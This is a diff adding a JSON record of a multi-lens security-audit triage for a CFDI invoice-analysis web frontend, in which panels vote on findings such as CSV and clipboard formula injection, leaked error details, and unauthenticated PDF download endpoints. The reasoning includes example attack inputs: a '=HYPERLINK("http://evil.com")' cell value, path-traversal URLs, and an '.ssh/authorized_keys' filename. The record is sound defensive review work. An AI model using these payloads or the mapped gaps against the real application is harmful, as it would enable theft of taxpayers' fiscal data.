@@ -1,0 +1,212 @@
+{
+  "rounds": {
+    "B8-FINDINGS-INJ-01": {
+      "panel": {"true": 3, "false": 0, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "ResolutionPanel.tsx:18 — CopyButton writes untrusted cfdi.uuid from XML to system clipboard without sanitization. 7+ correction step paths in useFindingContexts.ts all write via same CopyButton. Reachable from any CFDI analysis."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "User clicks 'Copiar UUID', pastes into Excel → formula (=HYPERLINK, =cmd) executes. CFDI UUIDs are attacker-crafted strings from XML — no format validation before clipboard write."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "No formula character prefixing (=, +, -, @) before clipboard write. No UUID format validation (v4 regex). No clipboard clearing on unmount/beforeunload. Zero defenses."}
+      ]
+    },
+    "B8-FINDINGS-INJ-02": {
+      "panel": {"true": 3, "false": 0, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "ConceptDetailModal.tsx:55 — .toFixed(6) on attacker-controlled valorUnitario. XML attribute Cantidad='1e500' produces Infinity passing getNumberAttr() NaN check, reaching .toFixed() which renders 'Infinity'."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "UI displays '$Infinity' for monetary values and 'Infinity%' for tax rates. Low impact: cosmetic only, no data corruption beyond display. User sees nonsensical values."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "getNumberAttr() checks isNaN but not isFinite. No defensive wrapper around .toFixed(). No value range validation in UI components. Zero guards."}
+      ]
+    },
+    "B8-FINDINGS-INJ-03": {
+      "panel": {"true": 2, "false": 1, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "useFindingContexts.ts:190 — template literal interpolates invalidCode from XML catalog findings into instructional text. Reachable through catalog validation findings."},
+        {"lens": "IMPACT", "verdict": "FALSE_POSITIVE", "reasoning": "React JSX escapes HTML, preventing XSS. The 'social engineering' scenario requires user to trust text displayed in an audit tool. Low practical exploitability — the tool's context already implies user is reviewing findings. This is more of a content integrity issue than security vulnerability."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "No sanitization or truncation of XML-derived strings before interpolation into user-facing instructional text. No length limits or character whitelists."}
+      ]
+    },
+    "B8-FINDINGS-AUTH-01": {
+      "panel": {"true": 3, "false": 0, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "InspectorHeader.tsx:210 — satError from useSatEnquiry renders in DOM. sat-enquiry-api-client.ts:27 captures backend detail, useSatEnquiry.ts:30 stores raw error. Path: backend HTTPException → API client → hook state → JSX. Fully reachable."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "Diverza API failures return httpx error strings with connection details. User sees internal error info including service names and network details visible in red error text in the inspector header."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "Only 'no configurado' string is filtered. All other backend exception strings pass through raw. No error message catalog, no generic fallback. Backend returns raw f-string exceptions in HTTPException.detail."}
+      ]
+    },
+    "B8-FINDINGS-AUTH-02": {
+      "panel": {"true": 2, "false": 1, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "InspectorHeader.tsx:209 — title attribute on SAT enquiry error indicator. When satError contains 'RFC emisor no configurado: XXXXXXXXXX', title holds full string with RFC."},
+        {"lens": "IMPACT", "verdict": "FALSE_POSITIVE", "reasoning": "RFC exposed only on hover over error icon. Requires screen sharing or shoulder surfing. RFC is semi-public (printed on invoices). The attack scenario is unrealistic for practical exploitation."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "Backend returns RFC directly in error detail. Frontend only filters 'no configurado' for visible text but leaves raw string in title attribute. No client-side stripping."}
+      ]
+    },
+    "B8-XML-INJ-01": {
+      "panel": {"true": 3, "false": 0, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "useBatchStats.ts:59 — parseFloat on BatchFileResult.total from backend. If backend returns 'Infinity' string (from CFDI with Total='Infinity'), parseFloat returns Infinity, passes isNaN guard."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "Infinity propagates to totalMonto accumulator → '$InfinityM MXN' in batch summary. Corrupts batch aggregation UI but low practical impact."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "isNaN guard catches NaN but not Infinity (!isFinite). No type guard after parseFloat. No validation of BatchFileResult.total format from backend API response."}
+      ]
+    },
+    "B8-XML-INJ-02": {
+      "panel": {"true": 3, "false": 0, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "cfdiAnalysisService.ts:53 — summarizeDifference called with getNum() output (attacker XML attr → Number()). NaN.toFixed(2) = 'NaN' string. Flows to finding.summary → FindingsSidebar."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "UI shows corrupted diagnostic text ('XML NaN vs cálculo 100.00'). Only cosmetic — doesn't affect data integrity or enable injection. React escaping prevents XSS."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "getNum() returns Number() raw (NaN possible). summarizeDifference() calls .toFixed() without isFinite guard. No validation before string interpolation."}
+      ]
+    },
+    "B8-XML-INJ-03": {
+      "panel": {"true": 2, "false": 1, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "cfdi-api-client.ts:130 — return response.json() as ApiAnalyzeResponse. Backend response JSON is deserialized and cast without validation. TypeScript 'as' cast has no runtime effect."},
+        {"lens": "IMPACT", "verdict": "FALSE_POSITIVE", "reasoning": "TypeError on malformed JSON from same-origin backend is a robustness issue, not a security vulnerability. Backend is same-origin and trusted. No attacker can influence the JSON shape without first compromising the backend — at which point deserialization validation is moot."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "No Zod/io-ts/manual type guards. All 5+ 'as' casts in cfdi-api-client.ts are unchecked. No try-catch around .json() for malformed responses."}
+      ]
+    },
+    "B8-XML-AUTH-01": {
+      "panel": {"true": 3, "false": 0, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "XmlNodeViewer.tsx:89 — sourceFile.text() reads full XML into state. tokenizeXml renders every attribute to DOM syntax-highlighted spans. All CFDI data (UUIDs, RFCs, amounts, concepts) in visible DOM."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "Sensitive fiscal data (taxpayer RFCs, invoice totals, line-item details) rendered in plain text in DOM. React DevTools exposes xmlContent state. Any XSS or browser extension can read full XML. This is the raw source XML with ALL fiscal data."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "No data masking, redaction, or attribute value filtering before rendering. Full XML tokenized and displayed. No access control check before sourceFile.text() read. No render-only-snippet mode."}
+      ]
+    },
+    "B8-XML-AUTH-02": {
+      "panel": {"true": 2, "false": 1, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "emisores-api-client.ts:19 — request() sends without Authorization. Backend emisores.py:49-77 has zero Depends() guards, no auth middleware in main.py:102-108. Cloud Run --allow-unauthenticated. Full chain reachable."},
+        {"lens": "IMPACT", "verdict": "FALSE_POSITIVE", "reasoning": "Frontend missing auth header has zero incremental impact — backend ignores auth headers even if sent. The real exposure (backend CRUD without auth) is a backend finding, not a frontend client finding. This finding blames the wrong layer."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "Zero Depends() guards on any emisores CRUD endpoint. Zero auth middleware. Fernet encryption is transparent at-rest, not access control. CORS is browser-only."}
+      ]
+    },
+    "B8-XML-AUTH-03": {
+      "panel": {"true": 2, "false": 1, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "XmlNodeViewer.tsx:167 — onAcceptChange passes modified XML to App.tsx handleDownloadModified which creates Blob and triggers download. Button visible whenever modifiedXml non-null."},
+        {"lens": "IMPACT", "verdict": "FALSE_POSITIVE", "reasoning": "User must already have the CFDI loaded and actively apply a correction before download is possible. This is a user-initiated action. The 'shared device' scenario applies to any download from any web app — not specific to this component."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "No session validation, re-authentication, or confirmation dialog before download. handleDownloadModified at App.tsx:301-309 triggers immediate Blob download."}
+      ]
+    },
+    "B8-EXTW-INJ-01": {
+      "panel": {"true": 3, "false": 0, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "useCfdiExports.ts:15 — escapeCsv defined without formula guard. Lines 110, 137, 166, 195 — all 4 export paths feed untrusted CFDI XML string fields through escapeCsv into downloadable CSV. 45+ fields from attacker-controlled XML."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "Attacker sets Emisor Nombre='=HYPERLINK(\"http://evil.com\")'. User exports CSV and opens in Excel → formula executes. Can exfiltrate cell data or trigger DDE commands. CSV formula injection is a well-documented attack vector — OWASP confirms."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "Only double-quote escaping applied. No formula character prefixing (=, +, -, @). No cell value validation. All 4 export functions identically vulnerable. Zero defenses against CSV injection."}
+      ]
+    },
+    "B8-EXTW-AUTH-01": {
+      "panel": {"true": 2, "false": 1, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "useCfdiExports.ts:181 — exportCurrentTable creates CSV blob and triggers download via programmatic <a> click. No confirmation dialog or access control check. Button in InspectorHeader.tsx:341 always visible."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "Full dataset (all pages' rows with UUIDs, RFCs, amounts) saved to Downloads with single click. Physical access scenario: attacker clicks 'Exportar' and retrieves file with all fiscal data."},
+        {"lens": "DEFENSES", "verdict": "FALSE_POSITIVE", "reasoning": "User must already have CFDI loaded (file drop or API call). The export downloads data the user already has in browser memory. This is a UX concern (no confirmation) rather than a security vulnerability — the user intentionally loaded the data and clicks Export."}
+      ]
+    },
+    "B8-EXTW-AUTH-02": {
+      "panel": {"true": 1, "false": 2, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "useCfdiExports.ts:184 — getSortedRowModel() returns entire dataset when no rows selected. User sees page 1 of grid, clicks Export, gets all rows."},
+        {"lens": "IMPACT", "verdict": "FALSE_POSITIVE", "reasoning": "This is a UX/UI design issue, not a security vulnerability. The user already has access to all data — pagination is just a display convenience. Exporting all rows when user expects page-only is surprising but doesn't enable unauthorized access."},
+        {"lens": "DEFENSES", "verdict": "FALSE_POSITIVE", "reasoning": "The selectedRowCount check (line 183) is a feature toggle between 'selected only' and 'all rows'. This is intentional design — not a missing defense. Adding a warning label would improve UX but isn't a security control."}
+      ]
+    },
+    "B8-SHELL-INJ-01": {
+      "panel": {"true": 2, "false": 1, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "App.tsx:106 — URLSearchParams(window.location.search).get('batch') reads attacker-controlled value. Passed as restoreBatchId → ConversionMasivaPage → pdf-download.ts URL construction via concatenation. Path traversal vectors (../../) flow through 6 URL sinks."},
+        {"lens": "IMPACT", "verdict": "FALSE_POSITIVE", "reasoning": "Browser's URL parser normalizes /.. in path component. fetch('/api/cfdi/pdf/batch/../../admin/delete/status') resolves correctly on the client side (browser normalizes), but the actual HTTP request goes to the normalized URL. Backend routing (FastAPI path params) uses exact path matching — /api/admin/delete doesn't exist. The path traversal resolves before the HTTP request leaves the browser, making the attack on a different backend endpoint infeasible."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "No format validation on batch param (UUID regex, alphanumeric whitelist). No encodeURIComponent at URL construction sinks. No server-side validation of batchId format in backend endpoints."}
+      ]
+    },
+    "B8-SHELL-INJ-02": {
+      "panel": {"true": 2, "false": 1, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "App.tsx:283 — Content-Disposition header parsed with regex /filename=(.+)/. Extracted value used as a.download. Backend controls Content-Disposition but MITM/backend compromise could inject malicious filename."},
+        {"lens": "IMPACT", "verdict": "FALSE_POSITIVE", "reasoning": "Modern browsers (Chrome, Firefox, Safari, Edge) all strip directory separators from a.download attribute. Attempting to set a.download='../../../.ssh/authorized_keys' results in the browser silently saving only 'authorized_keys' in the default downloads directory. The attack is fully mitigated by browser behavior."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "No filename sanitization (basename extraction, path separator stripping). Naive regex doesn't handle quoted filenames or RFC 5987 encoding. No second-layer validation."}
+      ]
+    },
+    "B8-SHELL-INJ-03": {
+      "panel": {"true": 2, "false": 1, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "App.tsx:259 — jobId from /api/cfdi/pdf/start JSON response interpolated into EventSource and fetch URLs without validation. If backend returns malicious jobId, frontend constructs unintended URLs."},
+        {"lens": "IMPACT", "verdict": "FALSE_POSITIVE", "reasoning": "Requires backend compromise to supply malicious jobId. If backend is compromised, attacker already controls the server and doesn't need URL manipulation. The frontend vulnerability is moot against a trusted backend. Same-origin backend is the trust anchor."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "No encodeURIComponent on jobId. No UUID format validation. No input sanitization before URL construction. Defense in depth is absent."}
+      ]
+    },
+    "B8-SHELL-AUTH-01": {
+      "panel": {"true": 3, "false": 0, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "main.tsx:18 — console.log with full import.meta.env on every page load. No DEV/PROD guard. Always executes in production builds."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "Exposes VITE_API_BASE_URL (Cloud Run production URL) and all VITE_-prefixed vars in browser console. Any future VITE_SENTRY_DSN, VITE_API_KEY added would be automatically exposed. Enables infrastructure reconnaissance."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "No import.meta.env.DEV guard. Logs entire env object rather than targeted variables. VARS_LOGGED comment at line 13 acknowledges this is intentional logging, not a debugging leftover."}
+      ]
+    },
+    "B8-SHELL-AUTH-02": {
+      "panel": {"true": 2, "false": 1, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "App.tsx:69 reads ?batch= from URL. App.tsx:106 stores as restoreBatchId. App.tsx:370 passes to ConversionMasivaPage. Full chain: URL → view router → Pusher connection → PDF downloads. Backend pdf.py:488,453,419 all zero-auth."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "pdf.py:488 (ZIP of all CFDI PDFs), pdf.py:603 (individual PDF), pdf.py:453 (ready files) — all zero auth. CFDI = Mexican tax invoices with RFCs, amounts, tax breakdowns — protected taxpayer data (CFF Art. 69). Batch share URL serves as bearer token for full fiscal data access."},
+        {"lens": "DEFENSES", "verdict": "FALSE_POSITIVE", "reasoning": "batch_id is UUID4 (122-bit random) — computationally infeasible to guess. This is capability-based security: possession of the unguessable token IS authorization (same as Google Drive 'anyone with the link'). Share URL is an intentional feature (ConversionMasivaPage.tsx:569 'Copiar link' button). No batch ID enumeration endpoint exists. CORS middleware present (main.py:95-100)."}
+      ]
+    },
+    "B8-SHELL-AUTH-03": {
+      "panel": {"true": 2, "false": 1, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "App.tsx:259 — EventSource constructed with only jobId in URL path. Backend pdf.py:561 SSE progress endpoint has zero auth dependencies. Anyone knowing jobId can connect."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "Attacker with jobId receives real-time PDF conversion progress. Combined with download endpoint (also zero-auth, pdf.py:603), attacker can download completed PDF. JobId is not user-bound or session-verified."},
+        {"lens": "DEFENSES", "verdict": "FALSE_POSITIVE", "reasoning": "JobId is UUID4 (pdf.py:246 — uuid.uuid4()) — unguessable 122-bit random. Same capability-based security model as batch IDs. No enumerable endpoint for job IDs. Knowledge of jobId = 122 bits of entropy, practically unguessable. The 'shared machine' threat still applies to any system without session timeouts."}
+      ]
+    },
+    "B8-SHELL-AUTH-04": {
+      "panel": {"true": 2, "false": 1, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "App.tsx:60 — full CFDIData stored in useState. React DevTools available in production. Zero disableReactDevTools calls in entire codebase. Browsable component state tree with all fiscal data."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "CFDI data (UUIDs, RFCs, totals, concept-level details) inspectable via DevTools Components tab. Requires physical access or remote DevTools (which implies existing compromise). Low exploitation frequency but high data sensitivity."},
+        {"lens": "DEFENSES", "verdict": "FALSE_POSITIVE", "reasoning": "React architecture inherently stores state in fiber tree. disableReactDevTools is not a standard security practice for React apps — it's obscurity, not security. The real defense is: (1) don't store raw sensitive data in state, (2) use production builds that strip component names, (3) enforce screen locks/session timeouts. The absence of disableReactDevTools is not a vulnerability per se — it's a defense-in-depth consideration at best."}
+      ]
+    },
+    "B8-SHELL-CRYPTO-01": {
+      "panel": {"true": 3, "false": 0, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "main.tsx:14 — Sentry.init with hardcoded DSN fallback. Any deploy without VITE_SENTRY_DSN env var silently sends telemetry to hardcoded project. SENTRY_DSN is in all builds."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "Third-party fork/deploy without setting VITE_SENTRY_DSN → all errors, stack traces, URLs, user breadcrumbs sent to original developer's Sentry project without deployer's knowledge or consent. Privacy concern for deployers."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "No check that DSN is explicitly configured vs hardcoded. Fallback DSN is live production value matching backend/.env SENTRY_DSN. Comment '# por si no está definida en Vercel' shows this was intentional."}
+      ]
+    },
+    "B8-BATCH-AUTH-01": {
+      "panel": {"true": 3, "false": 0, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "batch-api-client.ts:56 — response body text embedded in BatchFileResult error. batch-api-client.ts:54 reads response.text(), constructs makeErrorResult. Flows to BatchAnalysisPage.tsx:949 (table rendering) and ConversionMasivaPage.tsx:396 (alert())."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "Backend exception details (Python tracebacks, internal paths) displayed in batch results table and alert() dialogs. User sees internal server implementation details, enabling reconnaissance."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "No error message sanitization. Full response body text embedded in user-visible error field. No client-side stripping of sensitive patterns (paths, tracebacks). Backend also leaks detail via HTTPException.detail without sanitization."}
+      ]
+    },
+    "B8-BATCH-INJ-01": {
+      "panel": {"true": 2, "false": 1, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "pdf-download.ts:412 — localStorage batchId passed to pusher.subscribe('pdf-batch-' + batchId) without validation. localStorage is mutable by same-origin XSS or browser extensions."},
+        {"lens": "IMPACT", "verdict": "FALSE_POSITIVE", "reasoning": "Pusher server-side validates channel names. Invalid characters cause connection failure but don't enable data exfiltration. Attacker-controlled channel name would just fail to connect or connect to a different public channel — attacker gains no advantage since they can already subscribe to any public channel with the Pusher key (which is in the JS bundle)."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "No batchId format validation before channel name construction. No regex/alphanumeric whitelist. localStorage value parsed without schema validation at ConversionMasivaPage.tsx:294."}
+      ]
+    },
+    "B8-BATCH-CRYPTO-01": {
+      "panel": {"true": 3, "false": 0, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "pdf-download.ts:8 — resolveApiBaseUrl() console.logs API URL unconditionally. Called from 7 functions (watchBatchProgress, startZipConversion, etc). Always executes in production."},
+        {"lens": "IMPACT", "verdict": "TRUE_POSITIVE", "reasoning": "Cloud Run production URL logged to browser console on every batch operation. Infrastructure reconnaissance for attackers with console access."},
+        {"lens": "DEFENSES", "verdict": "TRUE_POSITIVE", "reasoning": "No import.meta.env.DEV guard. Logs entire base URL. URL is in JS bundle anyway but explicit console.log makes discovery trivial."}
+      ]
+    },
+    "B8-BATCH-CRYPTO-02": {
+      "panel": {"true": 1, "false": 2, "voters": 3},
+      "lenses": [
+        {"lens": "REACHABILITY", "verdict": "TRUE_POSITIVE", "reasoning": "pdf-download.ts:508 — downloadWithProgress assembles Blob from fetched streamed content. Content comes from GCS signed URL or backend download endpoint."},
+        {"lens": "IMPACT", "verdict": "FALSE_POSITIVE", "reasoning": "TLS provides transport integrity for the fetch. The signed GCS URL is authenticated. Backend is same-origin. Adding client-side hash verification would require a SECOND hash delivered through an independent channel — otherwise the compromised backend could just provide a matching hash. This is not a practical vulnerability: TLS + signed URL = sufficient integrity for this threat model."},
+        {"lens": "DEFENSES", "verdict": "FALSE_POSITIVE", "reasoning": "TLS provides integrity for the HTTP response. GCS signed URL is cryptographically authenticated. Adding a second hash verification would require out-of-band delivery (otherwise MITM/bypass provides matching hash). This is defense-in-depth beyond standard web application security requirements for document downloads."}
+      ]
+    }
+  }
+}
